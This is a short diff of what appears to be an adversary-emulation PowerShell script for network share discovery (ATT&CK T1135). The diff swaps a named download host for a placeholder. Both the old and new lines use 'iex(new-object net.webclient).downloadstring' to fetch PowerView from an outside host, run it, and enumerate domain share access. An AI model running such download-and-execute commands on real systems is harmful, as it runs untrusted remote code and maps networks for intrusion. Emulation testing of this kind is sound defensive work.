@@ -79,5 +79,5 @@ Write-Output "[$(Get-Date -UFormat '%m/%d/%Y %R:%S')] [T1135] Enumerate local sm
 
 # Powershell is used to execute the PowerView script to enumerate share access
 # Requires elevation: False
-iex(new-object net.webclient).downloadstring("https://download.powerperks.ca/PowerView.ps1"); Find-DomainShare -CheckShareAccess -Verbose
+iex(new-object net.webclient).downloadstring("https://<url>/PowerView.ps1"); Find-DomainShare -CheckShareAccess -Verbose
 Write-Output "[$(Get-Date -UFormat '%m/%d/%Y %R:%S')] [T1135] Enumerate domain share acces using PowerView"
